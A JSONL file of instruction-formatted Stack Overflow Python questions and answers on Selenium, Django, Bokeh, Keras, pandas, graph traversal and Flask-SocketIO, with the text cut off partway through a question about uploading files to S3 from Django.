{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n AttributeError: module 'selenium.webdriver.common.by' has no attribute 'XPATH' using Selenium Python<p>I'm starting in programming, so I created a simple code, but it's giving this error:<\/p>\n<p><img src=\"https:\/\/i.stack.imgur.com\/05Duz.png\" alt=\"enter image description here\" \/><\/p>\n<p>I'm using Jupyter Notebook, this is the code, if anyone knows what the problem is, please help me<\/p>\n<p><img src=\"https:\/\/i.stack.imgur.com\/ljbdC.png\" alt=\"enter image description here\" \/><\/p>","output_text":"<p>As the error already tells you, <code>by.XPATH<\/code> doesn't exist. But <code>by<\/code> has a class called <code>By<\/code> and it's attribute <code>XPATH<\/code>.<\/p>\n<p>Like that:<\/p>\n<pre><code>from selenium.webdriver.common.by import By\n\ndriver = ...\nelem = driver.find_element(By.XPATH, &quot;YOUR_XPATH&quot;)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n ImportError: cannot import name 'GuideTeacher' from 'teacher.models'<p>I have a Teacher model and a Academic model. When i import something in academic model from teacher model Then I found a Import Error like <\/p>\n\n<blockquote>\n  <p>File \"\/media\/sajib\/Work\/Project\/schoolmanagement\/teacher\/models.py\", line 3, in \n      from academic.models import Department, ClassInfo, Section, Session, Shift\n    File \"\/media\/sajib\/Work\/Project\/schoolmanagement\/academic\/models.py\", line 2, in \n      from teacher.models import GuideTeacher\n  ImportError: cannot import name 'GuideTeacher' from 'teacher.models' (\/media\/sajib\/Work\/Project\/schoolmanagement\/teacher\/models.py)<\/p>\n<\/blockquote>\n\n<p>Now how can i solve this?\nacademic\/models.py<\/p>\n\n<pre><code>from teacher.models import GuideTeacher\nclass ClassRegistration(models.Model):\n    department_select = (\n        ('general', 'General'),\n        ('science', 'Science'),\n        ('business', 'Business'),\n        ('humanities', 'Humanities')\n    )\n    department = models.CharField(choices=department_select, max_length=15, null=True)\n    class_name = models.ForeignKey(ClassInfo, on_delete=models.CASCADE, null=True)\n    section = models.ForeignKey(Section, on_delete=models.CASCADE, null=True)\n    session = models.ForeignKey(Session, on_delete=models.CASCADE, null=True)\n    shift = models.ForeignKey(Shift, on_delete=models.CASCADE, null=True)\n    guide_teacher = models.OneToOneField(GuideTeacher, on_delete=models.CASCADE, null=True)\n    date = models.DateField(auto_now_add=True)\n\n    class Meta:\n        unique_together = ['class_name', 'section', 'shift', 'guide_teacher']\n\n    def __str__(self):\n        return str(self.class_name)\n<\/code><\/pre>\n\n<p>teacher\/models.py<\/p>\n\n<pre><code>from academic.models import Department, ClassInfo, Section, Session, Shift\nclass GuideTeacher(models.Model):\n    name = models.OneToOneField(PersonalInfo, on_delete=models.CASCADE, null=True)\n    date = models.DateField(auto_now_add=True)\n\n    def __str__(self):\n        return str(self.name)\n<\/code><\/pre>","output_text":"<p>This is because of <a href=\"https:\/\/stackoverflow.com\/questions\/22187279\/python-circular-importing\"><strong>Circular Import<\/strong><\/a>. To get rid of the situation, remove the import statement in <code>academic\/models.py<\/code> and specify <strong>FK related model using string representation<\/strong><\/p>\n\n<pre><code>guide_teacher = models.OneToOneField(<b>'teacher.GuideTeacher'<\/b>, on_delete=models.CASCADE, null=True)<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n What is wrong with Bokeh image() plotting? It succeed but showed no graph<p>I have initially a Spark dataframe with data like that:<\/p>\n<pre><code>+-------------------+--------------+------+-----+\n|window_time        |delayWindowEnd|values|index|\n+-------------------+--------------+------+-----+\n|2022-01-24 18:00:00|999           |999   |2    |\n|2022-01-24 19:00:00|999           |999   |1    |\n|2022-01-24 20:00:00|999           |999   |3    |\n|2022-01-24 21:00:00|999           |999   |4    |\n|2022-01-24 22:00:00|999           |999   |5    |\n|2022-01-24 18:00:00|998           |998   |4    |\n|2022-01-24 19:00:00|998           |998   |5    |\n|2022-01-24 20:00:00|998           |998   |3    |\n<\/code><\/pre>\n<p>and I'd like to plot that as a heatmap with the following code in Apache Zeppelin:<\/p>\n<p>%spark.pyspark<\/p>\n<pre><code>import bkzep\nimport numpy as np\nfrom bokeh.io import output_notebook, show\nfrom bokeh.plotting import figure\nfrom bokeh.models import ColumnDataSource, ColorBar, LogColorMapper\nfrom bokeh.layouts import gridplot\nfrom pyspark.sql.functions import col, coalesce, lit, monotonically_increasing_id\nfrom pyspark.sql import DataFrame\nfrom pyspark.sql.functions import *\n\noutput_notebook(notebook_type='zeppelin')\n<\/code><\/pre>\n<p>then<\/p>\n<p>%pyspark<\/p>\n<p>from pyspark.sql.functions import *<\/p>\n<pre><code>def plot_summaries(sensor, dfName):\n    df = sqlContext.table(dfName)\n    pdf = df.toPandas()\n    source = ColumnDataSource(pdf)\n\n    color_mapper = LogColorMapper(palette=&quot;Viridis256&quot;, low=1, high=10)\n\n    plot = figure(toolbar_location=None,x_axis_type='datetime')\n    plot.image(x='window_time', y='delayWindowEnd', source=source, image='index',dw=1,dh=1,  color_mapper=color_mapper)\n\n    color_bar = ColorBar(color_mapper=color_mapper, label_standoff=12)\n\n    plot.add_layout(color_bar, 'right')\n    show(gridplot([plot], ncols=1, plot_width=1000, plot_height=400))\n\nsensors = [   \n&quot;all&quot;\n]\n<\/code><\/pre>\n<p>and then  finally<\/p>\n<pre><code>%pyspark\n\nfrom pyspark.sql.functions import *\n\nkeyCol = &quot;month_day_hour&quot;\n\nsensors = [\n    &quot;all&quot;]\n\n\nfor sensor in sensors:\n    plot_summaries(sensor, &quot;maxmin2&quot;)   \n<\/code><\/pre>\n<p>The latest one has been succeed, but I see no graph.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/0z2X4.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/0z2X4.png\" alt=\"Here I expect graph to be plotted and it is plotted if it isn't a heatmap with the code above\" \/><\/a><\/p>\n<p>That's probably because of parameters misuse.<\/p>\n<p>Is it ok to use dataframe column as image parameter (while other twos will be x and y axis). Are df and dw correctly initialized? It is ok to have X axis being a timestamp?<\/p>\n<p>If the reason is browser rendering, there is a JS error like below:<\/p>\n<pre><code>polyfills.d42c9551b0788083cd69.js:1 Uncaught Error: Error rendering Bokeh model: could not find #fb19be38-e25a-4ebf-a488-593cd2e9a4d6 HTML tag\n    at o (bokeh-1.3.4.min.js:31:143801)\n    at Object.n._resolve_root_elements (bokeh-1.3.4.min.js:31:144274)\n    at Object.n.embed_items_notebook (bokeh-1.3.4.min.js:31:147281)\n    at embed_document (&lt;anonymous&gt;:6:20)\n    at &lt;anonymous&gt;:15:9\n    at e.invokeTask (polyfills.d42c9551b0788083cd69.js:1:8063)\n    at t.runTask (polyfills.d42c9551b0788083cd69.js:1:3241)\n    at t.invokeTask (polyfills.d42c9551b0788083cd69.js:1:9170)\n    at i.useG.invoke (polyfills.d42c9551b0788083cd69.js:1:9061)\n    at n.args.&lt;computed&gt; (polyfills.d42c9551b0788083cd69.js:1:38948)\n<\/code><\/pre>\n<p>While the responce from Zeppelin backend with the execution and plotting results, reached the browser through websocket app, looks pretty and rather correct:<\/p>\n<p><a href=\"https:\/\/pastebin.com\/pLWBA8Cv\" rel=\"nofollow noreferrer\">https:\/\/pastebin.com\/pLWBA8Cv<\/a><\/p>","output_text":"<p>The answer was given here: <a href=\"https:\/\/discourse.bokeh.org\/t\/cant-render-heatmap-data-for-apache-zeppelins-pyspark-dataframe\/8844\" rel=\"nofollow noreferrer\">https:\/\/discourse.bokeh.org\/t\/cant-render-heatmap-data-for-apache-zeppelins-pyspark-dataframe\/8844<\/a><\/p>\n<p>The explanation what was wrong is explained in details are at the link above. Shortly, I wasn't applying the needed 2D array to the Bokeh and I had to produce it with <code>pandas<\/code>' <code>pivot<\/code> and <code>numpy<\/code>. Here is the solution:<\/p>\n<pre><code>dft = sqlContext.table(dfName)\npdf = dft.toPandas()\nimport pandas as pd\nrowIDs = pdf['values']\ncolIDs = pdf['window_time']\n\nA = pdf.pivot_table('index', 'values', 'window_time', fill_value=0)\nsource = ColumnDataSource(data={'x':[pd.to_datetime('Jan 24 2022')] #left most\n                           ,'y':[0] #bottom most \n                           ,'dw':[pdf['window_time'].max()-pdf['window_time'].min()] #TOTAL width of image\n                           #,'dh':[df['delayWindowEnd'].max()] #TOTAL height of image\n                           ,'dh':[1000] #TOTAL height of image\n                           ,'im':[A.to_numpy()] #2D array using to_numpy() method on pivotted df\n                           })\n\ncolor_mapper = LogColorMapper(palette=&quot;Viridis256&quot;, low=1, high=20)\n\nplot = figure(toolbar_location=None,x_axis_type='datetime')\nplot.image(x='x', y='y', source=source, image='im',dw='dw',dh='dh',  color_mapper=color_mapper)\n\ncolor_bar = ColorBar(color_mapper=color_mapper, label_standoff=12)\n\nplot.add_layout(color_bar, 'right')\nshow(gridplot([plot], ncols=1, plot_width=1000, plot_height=400)) \n<\/code><\/pre>\n<p>The result looks pretty for me:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/ryu5K.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/ryu5K.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to print the values of Keras tensors?<p>I have this code and i want to print the keras tensor values of 'out':<\/p>\n<pre><code>import tensorflow as tf\nfrom tensorflow.keras import Input\n\nbatch_size = 8\ninp = Input(shape=(batch_size, 7, 7,2048))\ninp = tf.squeeze(inp,axis=0)\nprint(inp.shape)\nlayer = Flatten()\nout = layer(inp)\nprint(out.shape)\nout = Dense(1,activation='sigmoid')(out)\nprint(out.shape)\nprint(layer.count_params())\n<\/code><\/pre>\n<p>i am running Tensorflow 2.6.0 on googele colab, i tried many way to print the out tensor values but nothing works.<\/p>","output_text":"<p>You should feed some data to your model in order to get some output values from your layers.<\/p>\n<pre><code>import tensorflow as tf\nfrom tensorflow.keras import Model\nfrom keras.layers import Flatten, Dense, Input\n\n### Model setup ###\ninp = Input(shape=(7, 7,2048))\n# inp = tf.squeeze(inp,axis=0) # ValueError: Graph disconnected\nlayer = Flatten()\nout = layer(inp)\nout = Dense(1,activation='sigmoid')(out)\n\nmodel = Model(inputs=inp,outputs=out)\n\n### Data ###\nbatch_size = 8\nmy_input = tf.random.uniform(shape=(batch_size,7,7,2048))\n\nprint(model(my_input)) # returns a tensor with the shape (batch_size,1)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Can't show the image with white text, opencv<p>The original image is <\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/OKc5O.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/OKc5O.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<pre><code>font                   = cv2.FONT_HERSHEY_SIMPLEX\nbottomLeftCornerOfText = (10,150)\nfontScale              = 1\nfontColor              = (255,255,255)\n\ncv2.putText(img=img,text='Hello World!', \n    org = bottomLeftCornerOfText,\n    fontFace=font, \n    fontScale=fontScale,\n    color=fontColor,\n    lineType=cv2.LINE_AA,\n    thickness=1)\n\n<\/code><\/pre>\n\n<p>After running the code above, I got image like this<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/YwiNw.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/YwiNw.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>Only text showed and the background image disappeared. I also tried other colors like blue and green, they all worked fine, both image and text were kept. I wonder why white text doesn't work here and how can I fix it.<\/p>","output_text":"<p>Is the image type float from 0.0 to 1.0? Is it one channel grayscale? You are assigning text color with 3 channels and 255 valued... Probably you're having trouble because of one of those.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Is it possible to traverse all connected nodes in a graph with DFS when cycles are present?<p>Is it possible to traverse all connected nodes in a graph with DFS when cycles are present?<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>g = {'a':['b','c'],\n     'b':['a','f'],\n     'c':['a','f'],\n     'd':['c','e'],\n     'e':['d'],\n     'f':['c','b'],\n     }\n\ndef dfs(graph, node):\n  stack = [node]\n  visited = []\n  while stack:\n    current = stack.pop()\n    visited.append(current)\n    next_nodes = list(filter(lambda x: x not in visited, graph[current]))\n    stack.extend(next_nodes)\n  return visited\n\ndfs(g,'a')   \n&gt;&gt;&gt;\n['a', 'c', 'f', 'b', 'b']\n<\/code><\/pre>\n<p>My solution is unable to reach <code>d<\/code> or <code>e<\/code>. Also it visits <code>b<\/code> twice, which is bizarre. How could this code be altered to traverse all nodes (if possible) without repeats to the <code>visited<\/code> array?<\/p>","output_text":"<p>You need to check whether a given node is already on the stack, else you may end up processing the same node twice:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def dfs(graph, node):\n    stack = [node]\n    visited = []\n    while stack:\n        current = stack.pop()\n        visited.append(current)\n        next_nodes = list(filter(lambda x: x not in visited + stack, graph[current]))\n        stack.extend(next_nodes)\n    return visited\n<\/code><\/pre>\n<p>As for the issue of some nodes not being visited, none of the nodes reachable from <code>'a'<\/code> have any outgoing neighbors to <code>'d'<\/code> or <code>'e'<\/code>. If your graph is meant to be undirected, you need to make sure that you're adding all the right entries for each node. If your graph is meant to be directed, this is expected behavior.<\/p>\n<hr \/>\n<p>We can also optimize this code. You could maintain a separate <code>seen<\/code> set, to be able to check more quickly whether you've seen a node or not (seen == &quot;on the stack or already visited&quot;):<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def dfs(graph, node):\n    stack = [node]\n    seen = {node}\n    visited = []\n    while stack:\n        current = stack.pop()\n        visited.append(current)\n        next_nodes = list(filter(lambda x: x not in seen, graph[current]))\n        stack.extend(next_nodes)\n        seen.update(next_nodes)\n\n    return visited\n<\/code><\/pre>\n<p>This outputs:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>['a', 'c', 'f', 'b']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n python: combine two columns into one and duplicate corresponding cells<p>There's a dataframe with three columns:<\/p>\n<pre><code>    ID    col1    col2\n0    item_1    abc    NaN\n1    item_2    bcd    NaN\n2    item_3    NaN    NaN\n3    item_4    mnb    lkj\n<\/code><\/pre>\n<p>I would like to combine <code>col1<\/code> and <code>col2<\/code> like this:<\/p>\n<pre><code>    ID    col1\n    item_1    abc\n    item_2    bcd\n    item_3    NaN\n    item_4    mnb\n    item_4    lkj\n<\/code><\/pre>\n<p>ID is not index but a column.<\/p>\n<p>I tried with <code>stack().reset_index()<\/code> but this is not what I want.<\/p>\n<p>Any ideas?<\/p>","output_text":"<p>This is the way to do it with stack.. the way you were trying it before -<\/p>\n<ol>\n<li>Step 1 - <code>df.stack()<\/code> only the col1 and col 2 (and drop the Nans as well), then keep only the integer with <code>reset_index()<\/code>\nindex that will be used to merge it in the next step<\/li>\n<li>Step 2 - <code>pd.merge()<\/code>\nthe initial DataFrame with the stacked one on their index<\/li>\n<li>Step 3 - DONE!<\/li>\n<\/ol>\n<pre><code>a = pd.DataFrame(df[['col1','col2']].stack(dropna=True),columns=['col1']).reset_index(level=1, drop=True)\npd.merge(df[['ID']],a,how='left',left_index=True, right_index=True)\n<\/code><\/pre>\n<pre><code>    ID  col1\n0   item_1  abc\n1   item_2  bcd\n2   item_3  NaN\n3   item_4  mnb\n3   item_4  lkj\n<\/code><\/pre>\n<p>Do update the correct answer in case you find this easier to understand, for anyone finding similar solutions. Cheers!<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I emit Flask-SocketIO requests with callbacks that still work after a user rejoins and their sid changes?<h1>Summarize the Problem<\/h1>\n<p>I am using Flask-SocketIO for a project and am basically trying to make it so that users can rejoin a room and &quot;pick up where they left off.&quot; To be more specific:<\/p>\n<ol>\n<li>The server emits a request to the client, with a callback to process the response and a timeout of 1 second. This is done in a loop so that the request is resent if a user rejoins the room.<\/li>\n<li>A user &quot;rejoining&quot; a room is defined as a user joining a room with the same name as a user who has previously been disconnected from that room. The user is given their new SID in this case and the request to the client is sent to the new SID.<\/li>\n<\/ol>\n<p>What I am seeing is this:<\/p>\n<ol>\n<li><p>If the user joins the room and does everything normally, the callback is processed correctly on the server.<\/p>\n<\/li>\n<li><p>It a user rejoins the room while the server is sending requests and then submits a response, everything on the JavaScript side works fine, the server receives an ack but does not actually run the callback that it is supposed to:<\/p>\n<pre><code>uV7BTVtBXwQ6oopnAAAE: Received packet MESSAGE data 313[&quot;#000000&quot;]\nreceived ack from Ac8wmpy2lK-kTQL7AAAF [\/]\n<\/code><\/pre>\n<\/li>\n<\/ol>\n<p>This question is similar to mine but the solution for them was to update Flask-SocketIO and I am running a version newer than theirs: <a href=\"https:\/\/stackoverflow.com\/questions\/67923690\/python-flask-socketio-server-receives-message-but-doesnt-trigger-event\">python flask-socketio server receives message but doesn&#39;t trigger event<\/a><\/p>\n<h1>Show Some Code<\/h1>\n<p>I have created a repository with a &quot;minimal&quot; example here: <a href=\"https:\/\/github.com\/eshapiro42\/socketio-example\" rel=\"nofollow noreferrer\">https:\/\/github.com\/eshapiro42\/socketio-example<\/a>.<\/p>\n<p>In case something happens to that link in the future, here are the relevant bits:<\/p>\n<pre><code># app.py\n\nfrom gevent import monkey\nmonkey.patch_all()\n\nimport flask_socketio\nfrom collections import defaultdict\nfrom flask import Flask, request, send_from_directory\n\nfrom user import User\n\n\napp = Flask(__name__)\nsocketio = flask_socketio.SocketIO(app, async_mode=&quot;gevent&quot;, logger=True, engineio_logger=True)\n\n\n@app.route(&quot;\/&quot;)\ndef base():\n    return send_from_directory(&quot;static&quot;, &quot;index.html&quot;)\n\n@app.route(&quot;\/&lt;path:path&gt;&quot;)\ndef home(path):\n    return send_from_directory(&quot;static&quot;, path)\n\n# Global dictionary of users, indexed by room\nconnected_users = defaultdict(list)\n# Global dictionary of disconnected users, indexed by room\ndisconnected_users = defaultdict(list)\n\n\n@socketio.on(&quot;join room&quot;)\ndef join_room(data):\n    sid = request.sid\n    username = data[&quot;username&quot;]\n    room = data[&quot;room&quot;]\n    flask_socketio.join_room(room)\n    # If the user is rejoining, change their sid\n    for room, users in disconnected_users.items():\n        for user in users:\n            if user.name == username:\n                socketio.send(f&quot;{username} has rejoined the room.&quot;, room=room)\n                user.sid = sid\n                # Add the user back to the connected users list\n                connected_users[room].append(user)\n                # Remove the user from the disconnected list\n                disconnected_users[room].remove(user)\n                return True\n    # If the user is new, create a new user\n    socketio.send(f&quot;{username} has joined the room.&quot;, room=room)\n    user = User(username, socketio, room, sid)\n    connected_users[room].append(user)\n    return True\n\n    \n@socketio.on(&quot;disconnect&quot;)\ndef disconnect():\n    sid = request.sid\n    # Find the room and user with this sid\n    user_found = False\n    for room, users in connected_users.items():\n        for user in users:\n            if user.sid == sid:\n                user_found = True\n                break\n        if user_found:\n            break\n    # If a matching user was not found, do nothing\n    if not user_found:\n        return\n    room = user.room\n    socketio.send(f&quot;{user.name} has left the room.&quot;, room=room)\n    # Remove the user from the room\n    connected_users[room].remove(user)\n    # Add the user to the disconnected list\n    disconnected_users[room].append(user)\n    flask_socketio.leave_room(room)\n\n\n@socketio.on(&quot;collect colors&quot;)\ndef collect_colors(data):\n    room = data[&quot;room&quot;]\n    for user in connected_users[room]:\n        color = user.call(&quot;send color&quot;, data)\n        print(f&quot;{user.name}'s color is {color}.&quot;)\n    \n\nif __name__ == &quot;__main__&quot;:\n    socketio.run(app, debug=True)\n<\/code><\/pre>\n<pre><code># user.py\n\nfrom threading import Event # Monkey patched\n\nclass User:\n    def __init__(self, name, socketio, room, sid):\n        self.name = name\n        self.socketio = socketio\n        self.room = room\n        self._sid = sid\n\n    @property\n    def sid(self):\n        return self._sid\n\n    @sid.setter\n    def sid(self, new_sid):\n        self._sid = new_sid\n\n    def call(self, event_name, data):\n        &quot;&quot;&quot;\n        Send a request to the player and wait for a response.\n        &quot;&quot;&quot;\n        event = Event()\n        response = None\n\n        # Create callback to run when a response is received\n        def ack(response_data):\n            print(&quot;WHY DOES THIS NOT RUN AFTER A REJOIN?&quot;)\n            nonlocal event\n            nonlocal response\n            response = response_data\n            event.set()\n      \n        # Try in a loop with a one second timeout in case an event gets missed or a network error occurs\n        tries = 0\n        while True:\n            # Send request\n            self.socketio.emit(\n                event_name,\n                data, \n                to=self.sid,\n                callback=ack,\n            )\n            # Wait for response\n            if event.wait(1):\n                # Response was received\n                break\n            tries += 1\n            if tries % 10 == 0:\n                print(f&quot;Still waiting for input after {tries} seconds&quot;)\n\n        return response\n<\/code><\/pre>\n<pre><code>\/\/ static\/client.js\n\nvar socket = io.connect();\n\nvar username = null;\nvar room = null;\nvar joined = false;\nvar colorCallback = null;\n\nfunction joinedRoom(success) {\n    if (success) {\n        joined = true;\n        $(&quot;#joinForm&quot;).hide();\n        $(&quot;#collectColorsButton&quot;).show();\n        $(&quot;#gameRoom&quot;).text(`Room: ${room}`);\n    }\n}\n\nsocket.on(&quot;connect&quot;, () =&gt; {\n    console.log(&quot;You are connected to the server.&quot;);\n});\n\nsocket.on(&quot;connect_error&quot;, (data) =&gt; {\n    console.log(`Unable to connect to the server: ${data}.`);\n});\n\nsocket.on(&quot;disconnect&quot;, () =&gt; {\n    console.log(&quot;You have been disconnected from the server.&quot;);\n});\n\nsocket.on(&quot;message&quot;, (data) =&gt; {\n    console.log(data);\n});\n\nsocket.on(&quot;send color&quot;, (data, callback) =&gt; {\n    $(&quot;#collectColorsButton&quot;).hide();\n    $(&quot;#colorForm&quot;).show();\n    console.log(`Callback set to ${callback}`);\n    colorCallback = callback;\n});\n\n$(&quot;#joinForm&quot;).on(&quot;submit&quot;, (event) =&gt; {\n    event.preventDefault();\n    username = $(&quot;#usernameInput&quot;).val();\n    room = $(&quot;#roomInput&quot;).val()\n    socket.emit(&quot;join room&quot;, {username: username, room: room}, joinedRoom);\n});\n\n$(&quot;#colorForm&quot;).on(&quot;submit&quot;, (event) =&gt; {\n    event.preventDefault();\n    var color = $(&quot;#colorInput&quot;).val();\n    $(&quot;#colorForm&quot;).hide();\n    colorCallback(color);\n});\n\n$(&quot;#collectColorsButton&quot;).on(&quot;click&quot;, () =&gt; {\n    socket.emit(&quot;collect colors&quot;, {username: username, room: room});\n});\n<\/code><\/pre>\n<pre><code>&lt;!-- static\/index.html  --&gt;\n\n&lt;!doctype html&gt;\n\n&lt;html lang=&quot;en&quot;&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;\n        &lt;title&gt;Socket.IO Example&lt;\/title&gt;\n    &lt;\/head&gt;\n\n    &lt;body&gt;\n        &lt;p id=&quot;gameRoom&quot;&gt;&lt;\/p&gt;\n\n        &lt;form id=&quot;joinForm&quot;&gt;\n            &lt;input id=&quot;usernameInput&quot; type=&quot;text&quot; placeholder=&quot;Your Name&quot; autocomplete=&quot;off&quot; required&gt;\n            &lt;input id=&quot;roomInput&quot; type=&quot;text&quot; placeholder=&quot;Room ID&quot; autocomplete=&quot;off&quot; required&gt;\n            &lt;button id=&quot;joinGameSubmitButton&quot; type=&quot;submit&quot; btn btn-dark&quot;&gt;Join Room&lt;\/button&gt;\n        &lt;\/form&gt;\n\n        &lt;button id=&quot;collectColorsButton&quot; style=&quot;display: none;&quot;&gt;Collect Colors&lt;\/button&gt;\n\n        &lt;form id=&quot;colorForm&quot; style=&quot;display: none;&quot;&gt;\n            &lt;p&gt;Please select a color.&lt;\/p&gt;\n            &lt;input id=&quot;colorInput&quot; type=&quot;color&quot; required&gt;\n            &lt;button id=&quot;colorSubmitButton&quot; type=&quot;submit&quot;&gt;Send Color&lt;\/button&gt;\n        &lt;\/form&gt;\n\n        &lt;script src=&quot;https:\/\/code.jquery.com\/jquery-3.3.1.min.js&quot; integrity=&quot;sha256-FgpCb\/KJQlLNfOu91ta32o\/NMZxltwRo8QtmkMRdAu8=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;\/script&gt;\n        &lt;script src=&quot;https:\/\/cdn.socket.io\/4.4.1\/socket.io.min.js&quot; integrity=&quot;sha384-fKnu0iswBIqkjxrhQCTZ7qlLHOFEgNkRmK2vaO\/LbTZSXdJfAu6ewRBdwHPhBo\/H&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;\/script&gt;\n        &lt;script src=&quot;client.js&quot;&gt;&lt;\/script&gt;\n    &lt;\/body&gt;\n&lt;\/html&gt;\n<\/code><\/pre>\n<h1>Edit<\/h1>\n<p><strong>Steps to Reproduce<\/strong><\/p>\n<ol>\n<li>Start the server <code>python app.py<\/code> and visit <code>localhost:5000<\/code> in your browser.<\/li>\n<li>Enter any username and Room ID and click &quot;Join Room.&quot;<\/li>\n<li>Click &quot;Collect Colors.&quot;<\/li>\n<li>Select a color and click &quot;Send.&quot; The selector should disappear and the server should print out a confirmation.<\/li>\n<li>Reload everything.<\/li>\n<li>Repeat steps 2 and 3 and copy the Room ID.<\/li>\n<li>Exit the page and then navigate back to it.<\/li>\n<li>Enter the <strong>same username and Room ID<\/strong> as you did in step 6 and click &quot;Join Room.&quot;<\/li>\n<li>Select a color and click &quot;Send.&quot; The selector disappears briefly but then comes back, since the server did not correctly process the response and keeps sending requests instead.<\/li>\n<\/ol>\n<h1>Edit 2<\/h1>\n<p>I managed to work around (not solve) the problem by adding more state variables on the server side and implementing a few more events to avoid using callbacks entirely. I would still love to know what was going wrong with the callback-based approach though since using that seems cleaner to me.<\/p>","output_text":"<p>The reason why those callbacks do not work is that you are making the emits from a context that is based on the old and disconnected socket.<\/p>\n<p>The callback is associated with the socket identified by <code>request.sid<\/code>. Associating the callback with a socket allows Flask-SocketIO to install the correct app and request contexts when the callback is invoked.<\/p>\n<p>The way that you coded your color prompt is not great, because you have a long running event handler that continues to run after the client goes aways and reconnects on a different socket. A better design would be for the client to send the selected color in its own event instead of as a callback response to the server.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Is there a way to shift pandas data frame first row only one cell to the right?<p><a href=\"https:\/\/i.stack.imgur.com\/meoYT.png\" rel=\"nofollow noreferrer\">enter image description here<\/a><\/p>\n<p>i'm trying to shift the first row only by one cell to the right so the dates start under number 1 column,\nalso i'm trying to remove the tailing '\\n' by doing this but its not working, any help please?<\/p>\n<pre><code>income_df2 = income_df2.replace('[\\$,)]','', regex=True )\\\n                     .replace( '[(]','-', regex=True)\\\n                     .replace( '', 'NaN', regex=True)\n<\/code><\/pre>","output_text":"<p>Yes, you can do something like this shift he first row of a dataframe to the right one column.  Use <code>iloc<\/code> to select this row  all columns which returns a pd.Series, then use <code>shift<\/code> to shift the values of this series one position and assign this newly shifted series back to the first row of the dataframe.<\/p>\n<pre><code>df.iloc[0, :] = df.iloc[0, :].shift()\n<\/code><\/pre>\n<p>MCVE:<\/p>\n<pre><code>import pandas as pd\nimport numpy as np\n\ndf = pd.DataFrame([[*'ABCD']+[np.nan],[1,2,3,4,5],[5,6,7,9,10],[11,12,13,14,15]])\n\ndf\n# Input DataFrame\n#    0   1   2   3     4\n# 0   A   B   C   D   NaN\n# 1   1   2   3   4   5.0\n# 2   5   6   7   9  10.0\n# 3  11  12  13  14  15.0\n\n\ndf.iloc[0, :] = df.iloc[0, :].shift()\n\ndf\n# Output DataFrame\n#      0   1   2   3   4\n# 0  NaN   A   B   C   D\n# 1    1   2   3   4   5\n# 2    5   6   7   9  10\n# 3   11  12  13  14  15 \n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to upload file in AWS S3 with django app?<p>I am facing a problem uploading the user profile picture. Now when I create a user in Django admin and upload a file from the admin dashboard it works correctly and no errors. It goes to my AWS S3 bucket as it should go, but this is obviously not feasible, I have been looking for the solution for 3 to 4 days but no success or any satisfactory results. I obviously won't be providing the dashboard access to the user. The database used is MongoDB, with a database engine as djongo.<\/p>\n<p>Here is my settings.py<\/p>\n<pre><code>INSTALLED_APPS = [\n    'profileupload',\n    's3direct',\n    'storages',\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'django.contrib.humanize',\n]\nSTATIC_URL = '\/static\/'\nMEDIA_ROOT = os.path.join(BASE_DIR, 'media')\nMEDIA_URL = '\/media\/'\nAWS_SECRET_ACCESS_KEY = 'MY_SPECIAL_KEY'\nAWS_ACCESS_KEY_ID = 'MY_SPECIAL_KEY_NAME'\nAWS_STORAGE_BUCKET_NAME = 'S3_BUCKET'\nAWS_S3_FILE_OVERWRITE = False\nAWS_DEFAULT_ACL = None\nDEFAULT_FILE_STORAGE = 'storages.backends.s3boto3.S3Boto3Storage'\n<\/code><\/pre>\n<p>My urls.py<\/p>\n<pre><code>from django.urls import path, include\nfrom .views import signup_form\nurlpatterns = [\n    path('signup', signup_form, name='signup'),\n]\n<\/code><\/pre>\n<p>My models.py<\/p>\n<pre><code>class profile(models.Model):\n    profile_id = models.AutoField(primary_key=True,unique=True)\n    profile_username = models.CharField(max_length=100,unique=True)\n    profile_name = 